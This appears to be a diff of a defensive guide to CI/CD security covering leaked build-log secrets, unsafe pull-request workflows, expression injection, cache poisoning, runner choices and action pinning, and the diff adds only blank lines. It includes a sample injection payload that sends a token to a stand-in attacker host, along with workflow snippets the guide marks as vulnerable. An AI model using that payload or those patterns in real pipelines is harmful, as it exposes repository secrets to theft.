@@ -37,6 +37,7 @@ Build logs capture pipeline output for debugging. Unfortunately, they often capt
 - Test output that reveals API responses
 
 Many CI/CD platforms attempt to redact known secrets, but redaction is imperfect:
+
 - Secrets may be printed in non-standard formats
 - Base64 or hex-encoded secrets may not be recognized
 - Partial secrets or secret derivatives may be logged
@@ -122,10 +123,14 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+
       - uses: actions/checkout@v4
+
         with:
           ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
+
       - run: npm install  # Runs attacker's postinstall scripts with secrets
+
 ```
 
 This pattern gives the PR author's code access to repository secrets. Attackers can submit PRs that exfiltrate secrets through malicious build scripts.
@@ -136,7 +141,9 @@ GitHub Actions workflows can be vulnerable to code injection through expression 
 
 ```yaml
 # DANGEROUS: Untrusted input directly in run command
+
 - run: echo "Building ${{ github.event.pull_request.title }}"
+
 ```
 
 If a PR title contains shell metacharacters or command injection payloads, they may be executed. An attacker could craft a PR with title `` `curl http://evil.com/steal?token=$SECRET` `` and achieve command execution.
@@ -169,7 +176,9 @@ Caches keyed only on filenames or partial hashes may be vulnerable:
 
 ```yaml
 # Potentially vulnerable: cache keyed only on lockfile
+
 - uses: actions/cache@v4
+
   with:
     path: ~/.npm
     key: npm-${{ hashFiles('package-lock.json') }}
@@ -204,12 +213,14 @@ Organizations choose between self-hosted CI/CD runners and cloud-provided manage
 **Cloud-Hosted Runners:**
 
 *Advantages:*
+
 - Fresh, ephemeral environment for each job
 - Provider handles security patching
 - No infrastructure management burden
 - Isolation between customer workloads
 
 *Risks:*
+
 - Shared infrastructure (potential for cross-tenant attacks)
 - Limited customization of security controls
 - Provider is a trust point
@@ -218,12 +229,14 @@ Organizations choose between self-hosted CI/CD runners and cloud-provided manage
 **Self-Hosted Runners:**
 
 *Advantages:*
+
 - Full control over environment and security configuration
 - No shared tenancy with other organizations
 - Custom network controls and monitoring
 - Access to internal resources without exposure
 
 *Risks:*
+
 - Persistent environment (state survives between jobs)
 - Organization must handle security patching
 - Compromise persists until detected
@@ -267,7 +280,9 @@ If attackers can modify pipeline definitions, they control what runs during buil
 Pipelines often use third-party actions or orbs:
 
 ```yaml
+
 - uses: some-org/some-action@v1  # What does this do?
+
 ```
 
 These components execute with the pipeline's privileges. A compromised third-party action affects every workflow using it.
@@ -278,10 +293,13 @@ These components execute with the pipeline's privileges. A compromised third-par
 
 ```yaml
 # RISKY: Tag can be moved to point to different code
+
 - uses: some-action@v1
 
 # SAFER: SHA pinning ensures specific version
+
 - uses: some-action@a1b2c3d4e5f6...
+
 ```
 
 Using tags rather than commit SHAs for actions allows maintainers (or attackers who compromise them) to change what code runs without changing the workflow file.
@@ -323,6 +341,7 @@ GitHub Actions caches are keyed partially on the action repository. If an attack
 **Detection Challenges:**
 
 Cache poisoning is difficult to detect because:
+
 - Cached content is expected to be executed
 - No visibility into cache provenance
 - No comparison between cached and fresh content
